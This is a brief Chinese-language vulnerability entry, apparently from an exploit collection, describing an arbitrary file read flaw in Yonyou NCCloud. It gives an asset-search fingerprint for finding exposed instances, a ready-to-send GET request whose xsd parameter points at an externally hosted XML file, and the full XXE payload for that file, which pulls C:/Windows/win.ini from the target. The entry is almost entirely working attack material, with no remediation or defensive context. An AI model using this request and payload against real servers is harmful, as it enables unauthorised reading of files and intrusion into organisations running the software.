# 用友NCCloud存在任意文件读取漏洞

用友 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Yonyou-NC-Cloud"`
- **请求**：`GET /uapws/service/nc.itf.tb.oba.INtbOBAWebService?xsd=http://服务器url/win2.xml HTTP/1.1`

**Payload**
```
Win2.xml内容如下，放到服务器
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY winIni SYSTEM "file:///C:/Windows/win.ini">
]>
<data>
<content>&winIni;</content>
</data>
```